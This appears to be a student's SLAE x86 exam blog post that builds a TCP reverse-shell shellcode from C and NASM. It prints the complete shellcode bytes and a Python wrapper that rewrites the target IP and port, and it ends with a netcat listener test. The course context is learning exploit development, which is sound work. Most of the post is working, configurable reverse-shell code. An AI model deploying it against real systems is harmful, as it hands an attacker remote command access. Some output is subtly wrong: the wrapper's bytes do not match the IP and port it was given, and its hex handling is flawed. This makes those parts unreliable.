---
layout: post
title:  "SLAE x86 Exam - Assignment 2"
categories: certs slae 
---


## Assignment #2 - TCP reverse shell
_Student ID: **PA-7854**_

The assignment indications are as follows:
* _Create a reverse shell TCP shellcode, where IP and port should be easily configurable_

This is somehow similar to the first assignment, but we need to add the IP parameter in both the Assembly code and the Python wrapper.

In summary, these are the steps  we will take in order to achieve the reverse TCP shell:
1. Writing a reverse shell in C 
2. Analyzing code
3. Replicating in Assembly
4. IP and Port wrapper


The code is available at [my github repo](https://github.com/0xKiewicz/SLAE)

#### 1. Writing a bind shell in C 

rev_shell.c
```c
  int sockfd;
  struct sockaddr_in remote_addr;
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  remote_addr.sin_family = AF_INET; // ipv4
  remote_addr.sin_port = htons(RPORT); // port in the correct endianness
  remote_addr.sin_addr.s_addr = inet_addr(RHOST);
  connect(sockfd, (struct sockaddr*) &remote_addr, sizeof(remote_addr));
  dup2(sockfd, 0); // stdin
```

We compile and run it, just to verify it's working and to ease the next step:

```bash
$ gcc -o rev_shell rev_shell.c
$ ./rev_shell
^C
```
Now it's time to analyze syscalls.

#### 2. Analyzing code
Since I've done this tedious work already, i just need to add the `connect` syscall which equals `0x16a` (362 in decimal) and the IP, which in this case i chose `127.1.1.1` to avoid NULL chars. 
```nasm
mov ax, 0x16a 		; connect syscall
push dword 0x0101017f   ; host 127.1.1.1 
```

#### 3. Replicating in Assembly
This time I decided to use _procedures_ and a loop for the `dup2` syscall in the NASM file.

```nasm
dup2:
        ; dup2(sockfd, 0); // stdin
        ; dup2(sockfd, 1); // stdout
        ; dup2(sockfd, 2); // stderr
        xor ecx, ecx            ; Clearing out ECX to initialize counter
        mov cl, 0x2             ; stdin, stdout and stderr
        xor eax, eax
dup2_fd:
        mov al, 0x3f            ; syscall 63
        int 0x80
        dec cl                  ; cl = cl - 1
        jns dup2_fd             ; jump back if not SF = 0

```		

After assembling and linking it, I validate just to see it works:
![Reverse shell](/assets/rev_shell.png)


Then I get the shellcode:
```bash
$ for i in $(objdump -d -M intel $f | grep "^ " | cut -f2); do echo -n '\\x'$i; done
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x66\xb8\x6a\x01\xb2\x10\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\xcd\x80
```
It does not contain NULL bytes, great! We can move forward.

#### 3. IP and Port wrapper
We need to tweak the Python wrapper from _assignment 1_ eases the IP-Port configuration as desired. Here are some changes made to the script:

```python
import socket
import binascii
ip = str(sys.argv[1])
port = int(sys.argv[2])
--snip--

ip = binascii.hexlify(socket.inet_aton(ip)).replace('00','')

--snip--
splitted[ip_offset:ip_offset+16] = '\\x' + str(ip[0:2]) + '\\x' + str(ip[2:4]) + '\\x' + str(ip[4:6]) + '\\x' + str(ip[6:8]) 

```

We just verify it's working:
```bash
$ python rev_shell_ip_port_wrapper.py 127.1.1.1 9797

New shellcode is: 
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc3\x68\x7f\x07\x07\x01\x66\x68\x23\x82\x66\x6a\x02\x89\xe1\x66\xb8\x6a\x01\xb2\x10\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\xcd\x80
```

We can add this to he `shellcode.c` file, compile and run to verify...
```bash
$ vim shellcode.c
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode
Shellcode Length:  85
```

```bash
$ nc -nvlp 9797
listening on [any] 9797 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44420
```



